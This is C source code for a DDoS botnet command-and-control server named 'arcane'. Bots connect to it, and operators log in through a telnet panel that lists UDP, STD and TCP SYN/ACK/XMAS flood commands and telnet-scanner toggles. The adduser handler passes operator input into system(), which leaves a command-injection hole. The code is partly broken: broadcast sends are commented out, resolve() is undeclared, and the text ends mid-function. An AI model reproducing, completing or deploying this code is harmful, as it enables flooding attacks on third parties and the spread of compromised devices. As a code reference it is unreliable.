#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

//#include "resolver.h"

char *ports[] = {"20", "21", "22", "23", "25", "53", "67", "68", "69", "80", "110", "123", "143", "443", "3074", "3075", "8080"};

#define MAXFDS 1000000
#define RED     "\e[90m"
#define GREEN   "\x1b[0;32m"
#define C_RESET   "\x1b[0m"

struct account {
    char id[5000]; 
    char password[5000];
    char user[5000];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break; // World Break!
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
          //      if(sendMGM && managements[i].connected)
          //      {                     
          //             send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
          //              send(i, sender, strlen(sender), MSG_NOSIGNAL);
          //              send(i, ": ", 2, MSG_NOSIGNAL); 
          //      }
          //      //  printf("sent to fd: %d\n", i);
          //      send(i, msg, strlen(msg), MSG_NOSIGNAL);
          //      if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[37m~> \x1b[0m", 13, MSG_NOSIGNAL);
          //      else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break; // World Break!
                                                else
                                                {
                                                        perror ("accept");
                                                        break; // World Break!
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; } // World Break!
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break; // World Break!
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; } // World Break!
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("buf: \"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break; // World Break!
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break; // World Break!
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; Devices Connected: %d || Users Logged In: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("\x1b[1;37m[\e[90m%d.%d.%d.%d\x1b[1;37m]\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\n\x1b[1;37m[\e[90m%d.%d.%d.%d\x1b[1;37m]",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char *staff = "staff";
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s %s", accounts[j].id, accounts[j].password, accounts[j].user);
            ++j;
        }
        sprintf(botnet, "");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
                sprintf(botnet, "\e[95mUsername\e[97m: ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){                  
        sprintf(botnet, "\e[95mPassword\e[97m: ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto arcanez;
        }
        failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];
        char failed_line2[5000];
        char clearscreen [5000];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");

        sprintf(failed_line1, "Login Attempt Saved.\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "Please contact the owner if you run into this issue!!\r\n");  // We are Attempting To Display FailedBanner!

        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(7);
        goto end; // You Have Failed!

        arcanez: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end;
		char ban_1 [5000];
		char ban_2 [5000];
		char ban_3 [5000];
		char ban_4 [5000];
		char ban_5 [5000];
		char ban_6 [5000];
		char ban_7 [5000];
		char ban_8 [5000];
		char ban_9 [5000];
		char ban_10 [5000];
		char ban_11 [5000];
		char ban_12 [5000];


  		sprintf(ban_1, "\e[90m��������������������������������������������������������������\r\n");
  		sprintf(ban_2, "\e[97m             d8888                                            \r\n");
  		sprintf(ban_3, "\e[97m            d88888                                            \r\n");
  		sprintf(ban_4, "\e[97m           d88P888                                            \r\n");
  		sprintf(ban_5, "\e[97m          d88P 888 888d888 .d8888b  8888b.  88888b.   .d88b.  \r\n");
  		sprintf(ban_6, "\e[97m         d88P  888 888P'  d88P'        '88b 888 '88b d8P  Y8b \r\n");
  		sprintf(ban_7, "\e[97m        d88P   888 888    888      .d888888 888  888 88888888 \r\n");
  		sprintf(ban_8, "\e[97m       d8888888888 888    Y88b.    888  888 888  888 Y8b.     \r\n");
  		sprintf(ban_9, "\e[97m      d88P     888 888     'Y8888P 'Y888888 888  888  'Y8888  \r\n");
  		sprintf(ban_10, "\e[90m                                                              \r\n");
  		sprintf(ban_11, "\e[90m                           welcome to \e[97marcane.           \r\n");
  		sprintf(ban_12, "\e[90m                          made by \e[97mswitch                \r\n");
  

  		if(send(thefd, ban_1, strlen(ban_1),   MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, ban_2, strlen(ban_2),   MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, ban_3, strlen(ban_3),   MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ban_4, strlen(ban_4),   MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ban_5, strlen(ban_5),   MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ban_6, strlen(ban_6),   MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ban_7, strlen(ban_7),   MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ban_8, strlen(ban_8),   MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ban_9, strlen(ban_9),   MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ban_10, strlen(ban_10),   MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ban_11, strlen(ban_11),   MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ban_12, strlen(ban_12),   MSG_NOSIGNAL) == -1) goto end;
        while(1) 
        { 
        sprintf(botnet, "\e[97marcane\e[90m#\e[37m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock); 
        managements[thefd].connected = 1;

        while(fdgets(buf, sizeof buf, thefd) > 0) // We are Displaying Attempting to display main banner!
        {  // We are Displaying Attempting to display main banner!
        if(strstr(buf, "BOTS") || strstr(buf, "bots") || strstr(buf, "devices") || strstr(buf, "DEVICES")) // We Are Reading The Connections!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[\e[97mArcane\x1b[1;37m.\e[90mssh\x1b[1;37m] - \e[90m %d \r\n\x1b[1;37m[\e[97mArcane\x1b[1;37m.\x1b[1;34users\x1b[1;37m] - \e[90m %d \r\n", clientsConnected(), managesConnected);      
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        } // Let Us Continue Our Journey!
       if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "?"))  {
				char hp1  [800];
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
				char hp8  [800];
				char hp9  [800];
				char hp10  [800];

				sprintf(hp1,  "\e[97mcommands:\r\n");
				sprintf(hp2,  "\e[97m!* ASTD IP PORT TIME\r\n");
				sprintf(hp3,  "\e[97m!* AUDP IP PORT TIME SIZE 0 32\r\n");
				sprintf(hp4,  "\e[97m!* ATCP IP PORT TIME FLAGS SIZE 0 32\r\n");
				sprintf(hp5,  "\e[97mother:\r\n");
				sprintf(hp6,  "\e[97mlogout\r\n");
				sprintf(hp7,  "\e[97mstop\r\n");
				sprintf(hp8,  "\e[97mclear\r\n");
				sprintf(hp9,  "\e[97mbots\r\n");
				sprintf(hp10,  "\e[97madmin\r\n");

				if(send(thefd, hp1,  strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp2,  strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp3,  strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp8,  strlen(hp8), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp9,  strlen(hp9), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, hp10,  strlen(hp10), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\e[97marcane\e[90m#\e[37m", accounts[find_line].id, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "SPECIAL") || strstr(buf, "ADMIN") || strstr(buf, "admin") || strstr(buf, "Admin") || strstr(buf, "special"))  // We Are Attempting To Display Special CMD's!
        {  // Let Us Continue Our Journey!
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_cmd1  [5000]; // We Are Attempting To Display Special CMD's!
        char special_line1  [5000]; // We Are Attempting To Display Special CMD's!
        char special_1  [5000]; // We Are Attempting To Display Special CMD's!
		char special_2  [5000];
        char special_line2  [5000]; // We Are Attempting To Display Special CMD's!

        sprintf(special_cmd1,  "\x1b[1;37m[\e[90m+\x1b[1;37m]Special Commands\x1b[1;37m[\e[90m+\x1b[1;37m]     \r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_line1,  "\x1b[1;37m[\e[90m+\x1b[1;37m]---------------------------------------------------------\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_1,  "\x1b[1;37m[\e[97mAdds User\x1b[1;37m]          \e[90m adduser\x1b[1;37m    [\e[90mUSER\x1b[1;37m] [\e[90mPASS\x1b[1;37m] [\e[90mSTAFF\x1b[1;37m]\r\n"); 
		sprintf(special_2,  "\x1b[1;37m[\e[97mDomain Resolver\x1b[1;37m]    \e[90m resolve\x1b[1;37m    [\e[90mURL\x1b[1;37m]\r\n");
        sprintf(special_line2,  "\x1b[1;37m[\e[90m+\x1b[1;37m]---------------------------------------------------------\r\n"); // We Are Attempting To Display Special CMD's!

        if(send(thefd, special_cmd1, strlen(special_cmd1),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_line1, strlen(special_line1),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_1, strlen(special_1),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
		if(send(thefd, special_2, strlen(special_2),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_line2,  strlen(special_line2),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        pthread_create(&title, NULL, &titleWriter, sock); // We Are Attempting To Display Special CMD's!
        while(1) { // We Are Attempting To Display Special CMD's!
        sprintf(botnet, "\e[97marcane\e[90m#\e[37m", accounts[find_line].id, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }  // Let Us Continue Our Journey!
        continue; // Let Us Continue Our Journey!
        } // Let Us Continue Our Journey!
        if(strstr(buf, "LOGOUT")) // WE ARE LOGGING OUT!
        {   // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].id, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("LOGOUT.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].id, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "logout")) // WE ARE LOGGING OUT!
        {   // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("LOGOUT.log", "a");
        fprintf(logFile, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "MOVE") || strstr(buf, "move")) // We Are logging Shell-Attempts!
        {    // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] Has Attempted To Shell Your Bots!\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] User: \e[90m%s\x1b[1;37m Has Attempted To Shell Your Bots!\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* STOP") || strstr(buf, "!* KILLATTK")) // We Are Attempting to kill Attack-Process!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "[Reaper] Attack Stopped!");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* UDP")) // We Are Sending UDP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mUDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* STD")) // We Are Sending STD Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mSTD \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
		 if (strstr(buf, "resolve") || strstr(buf, "RESOLVE")) {
      if(strcmp(staff, accounts[find_line].user) == 0)
      {
      char *ip[100];
      char *token = strtok(buf, " ");
      char *url = token+sizeof(token);
      trim(url);
      resolve(url, ip);
          sprintf(botnet, "Resolved \x1b[1;37m[\e[90m%s\x1b[1;37m] to \x1b[1;37m[\e[90m%s\x1b[1;37m]\r\n", url, ip);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
      }
      else
      {
        sprintf(botnet, "\x1b[1;37mYou Dont Have Permission To Use This\e[90m!\x1b[1;37\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }
        if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
        if(strcmp(staff, accounts[find_line].user) == 0)
        {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);
        trim(userinfo);
        char *uinfo[50];
        sprintf(uinfo, "echo '%s' >> arcane.txt", userinfo);
        system(uinfo);
        printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] \x1b[1;37mUser:[\e[90m%s\x1b[1;37m] Added User:[\e[90m%s\x1b[1;37m]\n", accounts[find_line].id, userinfo);
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] \x1b[1;37mUser:[\e[90m%s\x1b[1;37m] Added User:[\e[90m%s\x1b[1;37m]\r\n", accounts[find_line].id, userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
        else
        {
        sprintf(botnet, "\x1b[1;37mYou Dont Have \e[90mPermission\x1b[1;37m To Use This!\x1b[1;37m\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        }
        if(strstr(buf, "!* TCP")) // We Are Sending TCP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Loading sockets...\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "XMAS")) // We Are Reading TCP And Sending XMAS Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mT\x1b[1;32mC\x1b[1;33mP\e[90m-\x1b[1;35mX\x1b[1;36mM\e[90mA\x1b[1;32mS \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "ALL")) // We Are Reading All TCP Methods and Sending TCP Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP \x1b[1;37mFlood using \e[90mALL \x1b[1;37mMethods!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "SYN")) // We Are Reading TCP And Sending SYN Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-SYN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "FIN")) // We Are Reading TCP And Sending FIN Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-FIN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "RST")) // We Are Reading TCP And Sending RST Flood!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-RST \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "ACK")) // We Are Reading TCP And Sending ACK Flood!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-ACK \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "PSH")) // We Are Reading TCP And Sending PSH Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-PSH \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "TRIO")) // We Are Reading TCP And Sending TRIO Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-TRIO \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "PRO")) // We Are Reading TCP And Sending Pro Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-PRO \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRI")) // We Are Reading TCP And Sending Cri Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Sending \e[90mTCP-CRI \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* SCANNER ON")) // We Are Reading Client And Starting TelNet Scanner!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "TELNET SCANNER STARTED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* SCANNER OFF")) // We Are Reading Client And Stopping TelNet Scanner!
        {     // Let Us Continue Our Journey!
        sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }  // Let Us Continue Our Journey
        if (strstr(buf, "clear") || strstr(buf, "CLS") || strstr(buf, "CLEAR") || strstr(buf, "cls")) // We Are Clearing Screen!
        {   // Let Us Continue Our Journey!
        goto arcanez; // We Are Going Up to reaoer:
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        if (strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\e[97marcane\e[90m#\e[37m", accounts[find_line].id, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] - Command:\x1b[1;37m[\e[90m%s\x1b[1;37m]\n",accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] User:[\e[90m%s\x1b[1;37m] - Command:\x1b[1;37m[\e[90m%s\x1b[1;37m]\n", accounts[find_line].id, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        } // Let Us Continue Our Journey!
